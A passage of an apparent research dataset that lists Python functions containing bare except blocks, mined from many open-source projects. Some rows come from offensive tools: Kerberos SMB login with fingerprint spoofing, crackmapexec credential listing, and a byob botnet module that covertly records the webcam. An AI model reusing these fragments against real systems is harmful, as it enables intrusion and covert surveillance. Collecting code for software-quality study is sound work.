        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        if TGT is None:
            if TGS is None:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash, aesKey, kdcHost)
        else:
            tgt = TGT['KDC_REP']
            cipher = TGT['cipher']
            sessionKey = TGT['sessionKey']

        # Now that we have the TGT, we should ask for a TGS for cifs

        if TGS is None:
            serverName = Principal('cifs/%s' % self.__remote_name, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
        else:
            tgs = TGS['KDC_REP']
            cipher = TGS['cipher']
            sessionKey = TGS['sessionKey']

        smb = NewSMBPacket()

        # Are we required to sign SMB? If so we do it, if not we skip it
        if self._SignatureRequired:
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE


        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 61440
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE | SMB.CAP_LARGE_READX | SMB.CAP_LARGE_WRITEX


        # Let's build a NegTokenInit with the NTLMSSP
        # TODO: In the future we should be able to choose different providers

        blob = SPNEGO_NegTokenInit()

        # Kerberos v5 mech
        blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

        # Let's extract the ticket from the TGS
        tgs = decoder.decode(tgs, asn1Spec = TGS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(tgs['ticket'])

        # Now let's build the AP_REQ
        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq,'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = domain
        seq_set(authenticator, 'cname', userName.components_to_asn1)
        now = datetime.datetime.utcnow()

        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 11
        # AP-REQ Authenticator (includes application authenticator
        # subkey), encrypted with the application session key
        # (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        blob['MechToken'] = pack('B', ASN1_AID) + asn1encode(pack('B', ASN1_OID) + asn1encode(
            TypesMech['KRB5 - Kerberos 5']) + KRB5_AP_REQ + encoder.encode(apReq))

        sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
        sessionSetup['Parameters'].getData()
        sessionSetup['Data']['SecurityBlob']       = blob.getData()

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)
        self.sendSMB(smb)

        smb = self.recvSMB()
        if smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX):
            # We will need to use this uid field for all future requests/responses
            self._uid = smb['Uid']

            # Now we have to extract the blob to continue the auth process
            sessionResponse   = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(sessionResponse['Parameters'])
            sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])

            self._action = sessionParameters['Action']
            # If smb sign required, let's enable it for the rest of the connection
            if self._dialects_parameters['SecurityMode'] & SMB.SECURITY_SIGNATURES_REQUIRED:
               self._SigningSessionKey = sessionKey.contents
               self._SignSequenceNumber = 2
               self._SignatureEnabled = True

            # restore unicode flag if needed
            if flags2 & SMB.FLAGS2_UNICODE:
                self.__flags2 |= SMB.FLAGS2_UNICODE

            return 1
        else:
            raise Exception('Error: Could not login successfully')",Bare Except Catch Block,1
28,gitsome,/home/r4ph/desenv/phd/exception-miner/projects/py/gitsome/xonsh/ply/example/newclasscalc/calc.py,__init__,"def __init__(self, **kw):
        self.debug = kw.get('debug', 0)
        self.names = {}
        try:
            modname = os.path.split(os.path.splitext(__file__)[0])[
                1] + ""_"" + self.__class__.__name__
        except:
            modname = ""parser"" + ""_"" + self.__class__.__name__
        self.debugfile = modname + "".dbg""
        self.tabmodule = modname + ""_"" + ""parsetab""
        # print self.debugfile, self.tabmodule

        # Build the lexer and parser
        lex.lex(module=self, debug=self.debug)
        yacc.yacc(module=self,
                  debug=self.debug,
                  debugfile=self.debugfile,
                  tabmodule=self.tabmodule)",Bare Except Catch Block,1
29,lazagne,/home/r4ph/desenv/phd/exception-miner/projects/py/lazagne/Windows/lazagne/config/lib/memorpy/WinProcess.py,get_instruction,"def get_instruction(self, address):
        """"""
        Pydasm disassemble utility function wrapper. Returns the pydasm decoded instruction in self.instruction.
        """"""
        import pydasm
        try:
            data = self.read_bytes(int(address), 32)
        except:
            return 'Unable to disassemble at %08x' % address

        return pydasm.get_instruction(data, pydasm.MODE_32)",Bare Except Catch Block,1
30,paddlehub,/home/r4ph/desenv/phd/exception-miner/projects/py/paddlehub/modules/image/classification/efficientnetb1_imagenet/module.py,classification,"def classification(self, images=None, paths=None, batch_size=1, use_gpu=False, top_k=1):
        """"""
        API for image classification.

        Args:
            images (list[numpy.ndarray]): data of images, shape of each is [H, W, C], color space must be BGR.
            paths (list[str]): The paths of images.
            batch_size (int): batch size.
            use_gpu (bool): Whether to use gpu.
            top_k (int): Return top k results.

        Returns:
            res (list[dict]): The classfication results.
        """"""
        if use_gpu:
            try:
                _places = os.environ[""CUDA_VISIBLE_DEVICES""]
                int(_places[0])
            except:
                raise RuntimeError(
                    ""Environment Variable CUDA_VISIBLE_DEVICES is not set correctly. If you wanna use gpu, please set CUDA_VISIBLE_DEVICES as cuda_device_id.""
                )

        all_data = list()
        for yield_data in reader(images, paths):
            all_data.append(yield_data)

        total_num = len(all_data)
        loop_num = int(np.ceil(total_num / batch_size))

        res = list()
        for iter_id in range(loop_num):
            batch_data = list()
            handle_id = iter_id * batch_size
            for image_id in range(batch_size):
                try:
                    batch_data.append(all_data[handle_id + image_id])
                except:
                    pass
            # feed batch image
            batch_image = np.array([data['image'] for data in batch_data])

            predictor = self.gpu_predictor if use_gpu else self.cpu_predictor
            input_names = predictor.get_input_names()
            input_handle = predictor.get_input_handle(input_names[0])
            input_handle.copy_from_cpu(batch_image.copy())
            predictor.run()
            output_names = predictor.get_output_names()
            output_handle = predictor.get_output_handle(output_names[0])

            out = postprocess(data_out=output_handle.copy_to_cpu(), label_list=self.label_list, top_k=top_k)
            res += out
        return res",Bare Except Catch Block,1
31,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/ptempfile.py,remove_dir,"def remove_dir(x):
    try:
        import shutil
        shutil.rmtree(x, ignore_errors=True)
    except:
        pass",Bare Except Catch Block,1
32,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_okex.py,QA_SU_save_okex_symbol,"def QA_SU_save_okex_symbol(
    market=OKEx_EXCHANGE,
    client=DATABASE,
):
    """"""
    保存OKEx交易对信息
    """"""
    market =  market.upper()
    QA_util_log_info('Downloading {:s} symbol list...'.format(market))

    # 保存 OKEx API 原始 Symbol 数据备查阅，自动交易用得着
    raw_symbol_lists = QA_util_save_raw_symbols(
        QA_fetch_okex_symbols,
        market
    )
    if (len(raw_symbol_lists) > 0):
        # 保存到 QUANTAXIS.crypto_asset_list 数字资产列表，为了跨市场统一查询做数据汇总
        symbol_lists = pd.DataFrame(raw_symbol_lists)

        # market,symbol为 mongodb 索引字段，保存之前必须要检查存在
        symbol_lists['market'] = market
        symbol_lists['category'] = 1
        symbol_lists.rename(
            {
                'instrument_id': 'symbol',
                'tick_size': 'price_precision',
            },
            axis=1,
            inplace=True
        )

        symbol_lists['state'] = 'online'
        symbol_lists['name'] = symbol_lists.apply(
            lambda x: '{:s}/{:s}'.
            format(x['base_currency'].upper(),
                   x['quote_currency'].upper()),
            axis=1
        )
        symbol_lists['desc'] = symbol_lists['name']

        # 移除非共性字段，这些字段只有 broker 才关心，做对应交易所 broker 接口的时候在交易所 raw_symbol_lists
        # 数据中读取。
        symbol_lists.drop(
            [
                'min_size',
                'size_increment',
            ],
            axis=1,
            inplace=True
        )
        if ('_id' in symbol_lists.columns.values):
            # 有时有，必须单独删除
            symbol_lists.drop(
                [
                    '_id',
                ],
                axis=1,
                inplace=True
            )

        symbol_lists['created_at'] = int(
            time.mktime(datetime.datetime.now().utctimetuple())
        )
        symbol_lists['updated_at'] = int(
            time.mktime(datetime.datetime.now().utctimetuple())
        )

        coll_cryptocurrency_list = client.cryptocurrency_list
        coll_cryptocurrency_list.create_index(
            [('market',
              pymongo.ASCENDING),
             ('symbol',
              pymongo.ASCENDING)],
            unique=True
        )
        try:
            query_id = {'market': market}
            if (coll_cryptocurrency_list.count_documents(query_id) > 0):
                # 删掉重复数据
                query_id = {
                    'market': market,
                    'symbol': {
                        '$in': symbol_lists['symbol'].tolist()
                    }
                }
                coll_cryptocurrency_list.delete_many(query_id)
            coll_cryptocurrency_list.insert_many(
                QA_util_to_json_from_pandas(symbol_lists)
            )
            return symbol_lists
        except:
            QA_util_log_expection(
                'QA_SU_save_okex_symbol(): Insert_many(symbol) to ""cryptocurrency_list"" got Exception with {} klines'
                .format(len(symbol_lists))
            )
            pass
        return []",Bare Except Catch Block,1
33,easytrader,/home/r4ph/desenv/phd/exception-miner/projects/py/easytrader/easytrader/clienttrader.py,market_trade,"def market_trade(self, security, amount, ttype=None, limit_price=None, **kwargs):
        """"""
        市价交易
        :param security: 六位证券代码
        :param amount: 交易数量
        :param ttype: 市价委托类型，默认客户端默认选择，
                     深市可选 ['对手方最优价格', '本方最优价格', '即时成交剩余撤销', '最优五档即时成交剩余 '全额成交或撤销']
                     沪市可选 ['最优五档成交剩余撤销', '最优五档成交剩余转限价']

        :return: {'entrust_no': '委托单号'}
        """"""
        code = security[-6:]
        self._type_edit_control_keys(self._config.TRADE_SECURITY_CONTROL_ID, code)
        if ttype is not None:
            retry = 0
            retry_max = 10
            while retry < retry_max:
                try:
                    self._set_market_trade_type(ttype)
                    break
                except:
                    retry += 1
                    self.wait(0.1)
        self._set_market_trade_params(security, amount, limit_price=limit_price)
        self._submit_trade()

        return self._handle_pop_dialogs(
            handler_class=pop_dialog_handler.TradePopDialogHandler
        )",Bare Except Catch Block,1
34,xx-net,/home/r4ph/desenv/exception-miner/projects/py/xx-net/code/default/launcher/mac_tray.py,enableGlobalProxy_,"def enableGlobalProxy_(self, _):
        try:
            helperDisableAutoProxy(currentService)
            helperEnableGlobalProxy(currentService)
        except:
            disableAutoProxyCommand = getDisableAutoProxyCommand(currentService)
            enableGlobalProxyCommand = getEnableGlobalProxyCommand(currentService)
            executeCommand = 'do shell script ""%s;%s"" with administrator privileges' % (
            disableAutoProxyCommand, enableGlobalProxyCommand)

            xlog.info(""try enable global proxy:%s"", executeCommand)
            subprocess.call(['osascript', '-e', executeCommand])
        config.os_proxy_mode = ""gae""
        config.save()
        self.updateStatusBarMenu()",Bare Except Catch Block,1
35,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/client/android_sources/python-for-android/pythonforandroid/bootstraps/pygame/build/buildlib/jinja2.egg/jinja2/environment.py,render,"def render(self, *args, **kwargs):
        """"""This method accepts the same arguments as the `dict` constructor:
        A dict, a dict subclass or some keyword arguments.  If no arguments
        are given the context will be empty.  These two calls do the same::

            template.render(knights='that say nih')
            template.render({'knights': 'that say nih'})

        This will return the rendered template as unicode string.
        """"""
        vars = dict(*args, **kwargs)
        try:
            return concat(self.root_render_func(self.new_context(vars)))
        except:
            exc_info = sys.exc_info()
        return self.environment.handle_exception(exc_info, True)",Bare Except Catch Block,1
36,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/devices/usbms/device.py,eject_osx,"def eject_osx(self):
        for x in ('_main_prefix', '_card_a_prefix', '_card_b_prefix'):
            x = getattr(self, x, None)
            if x is not None:
                try:
                    subprocess.Popen(self.OSX_EJECT_COMMAND + [x])
                except:
                    pass",Bare Except Catch Block,1
37,paddleocr,/home/r4ph/desenv/exception-miner/projects/py/paddleocr/PPOCRLabel/PPOCRLabel.py,saveLabels,"def saveLabels(self, annotationFilePath, mode='Auto'):
        # Mode is Auto means that labels will be loaded from self.result_dic totally, which is the output of ocr model
        annotationFilePath = ustr(annotationFilePath)

        def format_shape(s):
            # print('s in saveLabels is ',s)
            return dict(label=s.label,  # str
                        line_color=s.line_color.getRgb(),
                        fill_color=s.fill_color.getRgb(),
                        points=[(int(p.x()), int(p.y())) for p in s.points],  # QPonitF
                        difficult=s.difficult,
                        key_cls=s.key_cls)  # bool

        if mode == 'Auto':
            shapes = []
        else:
            shapes = [format_shape(shape) for shape in self.canvas.shapes if shape.line_color != DEFAULT_LOCK_COLOR]
        # Can add differrent annotation formats here
        for box in self.result_dic:
            trans_dic = {""label"": box[1][0], ""points"": box[0], ""difficult"": False}
            if self.kie_mode:
                if len(box) == 3:
                    trans_dic.update({""key_cls"": box[2]})
                else:
                    trans_dic.update({""key_cls"": ""None""})
            if trans_dic[""label""] == """" and mode == 'Auto':
                continue
            shapes.append(trans_dic)

        try:
            trans_dic = []
            for box in shapes:
                trans_dict = {""transcription"": box['label'], ""points"": box['points'], ""difficult"": box['difficult']}
                if self.kie_mode:
                    trans_dict.update({""key_cls"": box['key_cls']})
                trans_dic.append(trans_dict)
            self.PPlabel[annotationFilePath] = trans_dic
            if mode == 'Auto':
                self.Cachelabel[annotationFilePath] = trans_dic

            # else:
            #     self.labelFile.save(annotationFilePath, shapes, self.filePath, self.imageData,
            #                         self.lineColor.getRgb(), self.fillColor.getRgb())
            # print('Image:{0} -> Annotation:{1}'.format(self.filePath, annotationFilePath))
            return True
        except:
            self.errorMessage(u'Error saving label data', u'Error saving label data')
            return False",Bare Except Catch Block,1
38,crackmapexec,/home/r4ph/desenv/phd/exception-miner/projects/py/crackmapexec/cme/protocols/winrm/db_navigator.py,do_hosts,"def do_hosts(self, line):
        filter_term = line.strip()

        if filter_term == """":
            hosts = self.db.get_hosts()
            self.display_hosts(hosts)
        else:
            hosts = self.db.get_hosts(filter_term=filter_term)

            if len(hosts) > 1:
                self.display_hosts(hosts)
            elif len(hosts) == 1:
                data = [[""HostID"", ""IP"", ""Port"", ""Hostname"", ""Domain"", ""OS""]]
                host_id_list = []

                for host in hosts:
                    host_id = host[0]
                    host_id_list.append(host_id)
                    ip = host[1]
                    port = host[2]
                    hostname = host[3]
                    domain = host[4]

                    try:
                        os = host[5].decode()
                    except:
                        os = host[5]

                    data.append([host_id, ip, port, hostname, domain, os])
                print_table(data, title=""Host"")

                data = [[""CredID"", ""CredType"", ""Domain"", ""UserName"", ""Password""]]
                for host_id in host_id_list:
                    links = self.db.get_admin_relations(host_id=host_id)

                    for link in links:
                        link_id, cred_id, host_id = link
                        creds = self.db.get_credentials(filter_term=cred_id)

                        for cred in creds:
                            cred_id = cred[0]
                            domain = cred[1]
                            username = cred[2]
                            password = cred[3]
                            credtype = cred[4]
                            # pillaged_from = cred[5]
                            data.append([cred_id, credtype, domain, username, password])
                print_table(data, title=""Credential(s) with Admin Access"")",Bare Except Catch Block,1
39,crackmapexec,/home/r4ph/desenv/phd/exception-miner/projects/py/crackmapexec/cme/protocols/smb.py,kerberos_login,"def kerberos_login(self, domain, username, password="""", ntlm_hash="""", aesKey="""", kdcHost="""", useCache=False):
        logging.getLogger(""impacket"").disabled = True
        # Re-connect since we logged off
        if not self.no_ntlm:
            fqdn_host = f""{self.hostname}.{self.domain}""
        else:
            fqdn_host = f""{self.host}""
        self.create_conn_obj(fqdn_host)
        lmhash = """"
        nthash = """"

        try:
            if not self.args.laps:
                self.password = password
                self.username = username
                # This checks to see if we didn't provide the LM Hash
                if ntlm_hash.find("":"") != -1:
                    lmhash, nthash = ntlm_hash.split("":"")
                    self.hash = nthash
                else:
                    nthash = ntlm_hash
                    self.hash = ntlm_hash
                if lmhash:
                    self.lmhash = lmhash
                if nthash:
                    self.nthash = nthash

                if not all("""" == s for s in [self.nthash, password, aesKey]):
                    kerb_pass = next(s for s in [self.nthash, password, aesKey] if s)
                else:
                    kerb_pass = """"
                    self.logger.debug(f""Attempting to do Kerberos Login with useCache: {useCache}"")

                self.conn.kerberosLogin( username, password, domain, lmhash, nthash, aesKey, kdcHost, useCache=useCache)
                self.check_if_admin()

                if username == """":
                    self.username = self.conn.getCredentials()[0]
                else:
                    self.username = username

                used_ccache = "" from ccache"" if useCache else f"":{process_secret(kerb_pass)}""
            else:
                self.plaintext_login(self.hostname, username, password)
                return True

            out = f""{self.domain}\\{self.username}{used_ccache} {self.mark_pwned()}""
            self.logger.success(out)
            if not self.args.local_auth:
                add_user_bh(self.username, domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                try:
                    self.conn.logoff()
                except:
                    pass
                self.create_conn_obj()

            return True
        except SessionKeyDecryptionError:
            # success for now, since it's a vulnerability - previously was an error
            self.logger.success(
                f""{domain}\\{self.username} account vulnerable to asreproast attack"",
                color=""yellow"",
            )
            return False
        except (FileNotFoundError, KerberosException) as e:
            self.logger.fail(f""CCache Error: {e}"")
            return False
        except OSError as e:
            used_ccache = "" from ccache"" if useCache else f"":{process_secret(kerb_pass)}""
            self.logger.fail(f""{domain}\\{self.username}{used_ccache} {e}"")
        except (SessionError, Exception) as e:
            error, desc = e.getErrorString()
            used_ccache = "" from ccache"" if useCache else f"":{process_secret(kerb_pass)}""
            self.logger.fail(
                f""{domain}\\{self.username}{used_ccache} {error} {f'({desc})' if self.args.verbose else ''}"",
                color=""magenta"" if error in smb_error_status else ""red"",
            )
            if error not in smb_error_status:
                self.inc_failed_login(username)
                return False
            return False",Bare Except Catch Block,1
40,dgl,/home/r4ph/desenv/phd/exception-miner/projects/py/dgl/python/dgl/utils/internal.py,wrapper,"def wrapper(self, *args, **kwargs):
            # pylint: disable=W0703,bare-except
            try:
                return func(self, *args, **kwargs)
            except:
                fix_method(self)
                return func(self, *args, **kwargs)",Bare Except Catch Block,1
41,abu,/home/r4ph/desenv/phd/exception-miner/projects/py/abu/abupy/UtilBu/ABuWinUtil.py,__init__,"def __init__(self, title, msg):
        message_map = {
            win32con.WM_DESTROY: self.on_destroy,
        }
        # Register the Window class.
        wc = WNDCLASS()
        hinst = wc.hInstance = GetModuleHandle(None)
        wc.lpszClassName = ""PythonTaskbarDemo""
        wc.lpfnWndProc = message_map  # could also specify a wndproc.
        class_atom = RegisterClass(wc)
        # Create the Window.
        style = win32con.WS_OVERLAPPED | win32con.WS_SYSMENU
        self.hwnd = CreateWindow(class_atom, ""Taskbar Demo"", style,
                                 0, 0, win32con.CW_USEDEFAULT, win32con.CW_USEDEFAULT,
                                 0, 0, hinst, None)
        UpdateWindow(self.hwnd)
        icon_path_name = os.path.abspath(os.path.join(sys.prefix, ""pyc.ico""))
        icon_flags = win32con.LR_LOADFROMFILE | win32con.LR_DEFAULTSIZE
        # noinspection PyBroadException
        try:
            hicon = LoadImage(hinst, icon_path_name, win32con.IMAGE_ICON, 0, 0, icon_flags)
        except:
            hicon = LoadIcon(0, win32con.IDI_APPLICATION)
        flags = NIF_ICON | NIF_MESSAGE | NIF_TIP
        nid = (self.hwnd, 0, flags, win32con.WM_USER + 20, hicon, ""Balloon  tooltip demo"")
        Shell_NotifyIcon(NIM_ADD, nid)
        self.show_balloon(title, msg)
        time.sleep(20)
        DestroyWindow(self.hwnd)",Bare Except Catch Block,1
42,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/gui2/catalog/catalog_epub_mobi.py,preset_save,"def preset_save(self):
        names = ['']
        names.extend(self.preset_field_values)
        try:
            dex = names.index(self.preset_search_name)
        except:
            dex = 0
        name = ''
        while not name:
            name, ok =  QInputDialog.getItem(self, _('Save catalog preset'),
                    _('Preset name:'), names, dex, True)
            if not ok:
                return
            if not name:
                error_dialog(self, _(""Save catalog preset""),
                        _(""You must provide a name.""), show=True)
        new = True
        name = str(name)
        if name in self.presets.keys():
            if not question_dialog(self, _(""Save catalog preset""),
                    _(""That saved preset already exists and will be overwritten. ""
                        ""Are you sure?"")):
                return
            new = False

        preset = {}
        prefix_rules_processed = False
        exclusion_rules_processed = False

        for opt in self.OPTION_FIELDS:
            c_name, c_def, c_type = opt
            if c_name == 'exclusion_rules_tw' and exclusion_rules_processed:
                continue
            if c_name == 'prefix_rules_tw' and prefix_rules_processed:
                continue

            if c_type in ['check_box', 'radio_button']:
                opt_value = getattr(self, c_name).isChecked()
            elif c_type in ['combo_box']:
                if c_name == 'preset_field':
                    continue
                opt_value = str(getattr(self,c_name).currentText()).strip()
            elif c_type in ['line_edit']:
                opt_value = str(getattr(self, c_name).text()).strip()
            elif c_type in ['spin_box']:
                opt_value = str(getattr(self, c_name).value())
            elif c_type in ['table_widget']:
                if c_name == 'prefix_rules_tw':
                    opt_value = self.prefix_rules_table.get_data()
                    prefix_rules_processed = True
                if c_name == 'exclusion_rules_tw':
                    opt_value = self.exclusion_rules_table.get_data()
                    exclusion_rules_processed = True

            preset[c_name] = opt_value
            # Construct cli version of table rules
            if c_name in ['exclusion_rules_tw','prefix_rules_tw']:
                self.construct_tw_opts_object(c_name, opt_value, preset)

        format, title = self.get_format_and_title()
        preset['format'] = format
        preset['catalog_title'] = title

        # Additional items needed for cli invocation
        # Generate specs for merge_comments, header_note_source_field, genre_source_field
        checked = ''
        if self.merge_before.isChecked():
            checked = 'before'
        elif self.merge_after.isChecked():
            checked = 'after'
        include_hr = self.include_hr.isChecked()
        preset['merge_comments_rule'] = ""%s:%s:%s"" % \
            (self.merge_source_field_name, checked, include_hr)

        preset['header_note_source_field'] = str(self.header_note_source_field.currentText())
        preset['genre_source_field'] = str(self.genre_source_field.currentText())

        # Append the current output profile
        try:
            preset['output_profile'] = load_defaults('page_setup')['output_profile']
        except:
            preset['output_profile'] = 'default'

        self.presets[name] = preset
        self.presets.commit()

        if new:
            self.preset_field.blockSignals(True)
            self.preset_field.clear()
            self.preset_field.addItem('')
            self.preset_field_values = sorted(self.presets, key=sort_key)
            self.preset_field.addItems(self.preset_field_values)
            self.preset_field.blockSignals(False)
        self.preset_field.setCurrentIndex(self.preset_field.findText(name))",Bare Except Catch Block,1
43,byob,/home/r4ph/desenv/phd/exception-miner/projects/py/byob/web-gui/buildyourownbotnet/modules/webcam.py,video,"def video(*args, **kwargs):
    try:
        fpath = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name == 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
        fourcc = cv2.VideoWriter_fourcc(*'DIVX') if os.name == 'nt' else cv2.VideoWriter_fourcc(*'XVID')
        output = cv2.VideoWriter(fpath, fourcc, 20.0, (640,480))
        length = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
        end = time.time() + length
        dev = cv2.VideoCapture(0)
        while True:
            ret, frame = dev.read()
            output.write(frame)
            if time.time() > end: break
        dev.release()
        with open(fpath, 'rb') as fp:
            result = base64.b64encode(fp.read())
        try:
            util.delete(fpath)
        except: pass
        return result
    except Exception as e:
        return '{} error: {}'.format(video.__name__, str(e))",Bare Except Catch Block,1
44,sqlmap,/home/r4ph/desenv/exception-miner/projects/py/sqlmap/lib/core/option.py,_setHTTPHandlers,"def _setHTTPHandlers():
    """"""
    Check and set the HTTP/SOCKS proxy for all HTTP requests.
    """"""

    with kb.locks.handlers:
        if conf.proxyList:
            conf.proxy = conf.proxyList[0]
            conf.proxyList = conf.proxyList[1:] + conf.proxyList[:1]

            if len(conf.proxyList) > 1:
                infoMsg = ""loading proxy '%s' from a supplied proxy list file"" % conf.proxy
                logger.info(infoMsg)

        elif not conf.proxy:
            if conf.hostname in (""localhost"", ""127.0.0.1"") or conf.ignoreProxy:
                proxyHandler.proxies = {}

        if conf.proxy:
            debugMsg = ""setting the HTTP/SOCKS proxy for all HTTP requests""
            logger.debug(debugMsg)

            try:
                _ = _urllib.parse.urlsplit(conf.proxy)
            except Exception as ex:
                errMsg = ""invalid proxy address '%s' ('%s')"" % (conf.proxy, getSafeExString(ex))
                raise SqlmapSyntaxException(errMsg)

            hostnamePort = _.netloc.rsplit("":"", 1)

            scheme = _.scheme.upper()
            hostname = hostnamePort[0]
            port = None
            username = None
            password = None

            if len(hostnamePort) == 2:
                try:
                    port = int(hostnamePort[1])
                except:
                    pass  # drops into the next check block

            if not all((scheme, hasattr(PROXY_TYPE, scheme), hostname, port)):
                errMsg = ""proxy value must be in format '(%s)://address:port'"" % ""|"".join(_[0].lower() for _ in getPublicTypeMembers(PROXY_TYPE))
                raise SqlmapSyntaxException(errMsg)

            if conf.proxyCred:
                _ = re.search(r""\A(.*?):(.*?)\Z"", conf.proxyCred)
                if not _:
                    errMsg = ""proxy authentication credentials ""
                    errMsg += ""value must be in format username:password""
                    raise SqlmapSyntaxException(errMsg)
                else:
                    username = _.group(1)
                    password = _.group(2)

            if scheme in (PROXY_TYPE.SOCKS4, PROXY_TYPE.SOCKS5):
                proxyHandler.proxies = {}

                if scheme == PROXY_TYPE.SOCKS4:
                    warnMsg = ""SOCKS4 does not support resolving (DNS) names (i.e. causing DNS leakage)""
                    singleTimeWarnMessage(warnMsg)

                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5 if scheme == PROXY_TYPE.SOCKS5 else socks.PROXY_TYPE_SOCKS4, hostname, port, username=username, password=password)
                socks.wrapmodule(_http_client)
            else:
                socks.unwrapmodule(_http_client)

                if conf.proxyCred:
                    # Reference: http://stackoverflow.com/questions/34079/how-to-specify-an-authenticated-proxy-for-a-python-http-connection
                    proxyString = ""%s@"" % conf.proxyCred
                else:
                    proxyString = """"

                proxyString += ""%s:%d"" % (hostname, port)
                proxyHandler.proxies = {""http"": proxyString, ""https"": proxyString}

            proxyHandler.__init__(proxyHandler.proxies)

        if not proxyHandler.proxies:
            for _ in (""http"", ""https""):
                if hasattr(proxyHandler, ""%s_open"" % _):
                    delattr(proxyHandler, ""%s_open"" % _)

        debugMsg = ""creating HTTP requests opener object""
        logger.debug(debugMsg)

        handlers = filterNone([multipartPostHandler, proxyHandler if proxyHandler.proxies else None, authHandler, redirectHandler, rangeHandler, chunkedHandler if conf.chunked else None, httpsHandler])

        if not conf.dropSetCookie:
            if not conf.loadCookies:
                conf.cj = _http_cookiejar.CookieJar()
            else:
                conf.cj = _http_cookiejar.MozillaCookieJar()
                resetCookieJar(conf.cj)

            handlers.append(_urllib.request.HTTPCookieProcessor(conf.cj))

        # Reference: http://www.w3.org/Protocols/rfc2616/rfc2616-sec8.html
        if conf.keepAlive:
            warnMsg = ""persistent HTTP(s) connections, Keep-Alive, has ""
            warnMsg += ""been disabled because of its incompatibility ""

            if conf.proxy:
                warnMsg += ""with HTTP(s) proxy""
                logger.warning(warnMsg)
            elif conf.authType:
                warnMsg += ""with authentication methods""
                logger.warning(warnMsg)
            else:
                handlers.append(keepAliveHandler)

        opener = _urllib.request.build_opener(*handlers)
        opener.addheaders = []  # Note: clearing default ""User-Agent: Python-urllib/X.Y""
        _urllib.request.install_opener(opener)",Bare Except Catch Block,1
45,vaex,/home/r4ph/desenv/phd/exception-miner/projects/py/vaex/packages/vaex-core/vaex/dataframe.py,selections_favorite_load,"def selections_favorite_load(self):
        try:
            path = os.path.join(self.get_private_dir(create=True), ""favorite_selection.yaml"")
            if os.path.exists(path):
                selections_dict = vaex.utils.read_json_or_yaml(path)
                for key, value in selections_dict.items():
                    self.favorite_selections[key] = selections.selection_from_dict(self, value)
        except:
            logger.exception(""non fatal error"")",Bare Except Catch Block,1
46,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_tdx.py,__saving_work,"def __saving_work(code, coll):

        QA_util_log_info(
            '##JOB07 Now Saving ETF_MIN ==== {}'.format(str(code)),
            ui_log=ui_log
        )
        try:

            for type in ['1min', '5min', '15min', '30min', '60min']:
                ref_ = coll.find({'code': str(code)[0:6], 'type': type})
                end_time = str(now_time())[0:19]
                if ref_.count() > 0:
                    start_time = ref_[ref_.count() - 1]['datetime']

                    QA_util_log_info(
                        '##JOB07.{} Now Saving {} from {} to {} =={} '.format(
                            ['1min',
                             '5min',
                             '15min',
                             '30min',
                             '60min'].index(type),
                            str(code),
                            start_time,
                            end_time,
                            type
                        ),
                        ui_log=ui_log
                    )

                    if start_time != end_time:
                        __data = QA_fetch_get_index_min(
                            str(code),
                            start_time,
                            end_time,
                            type
                        )
                        if len(__data) > 1:
                            coll.insert_many(
                                QA_util_to_json_from_pandas(__data[1::])
                            )
                else:
                    start_time = '2015-01-01'

                    QA_util_log_info(
                        '##JOB07.{} Now Saving {} from {} to {} =={} '.format(
                            ['1min',
                             '5min',
                             '15min',
                             '30min',
                             '60min'].index(type),
                            str(code),
                            start_time,
                            end_time,
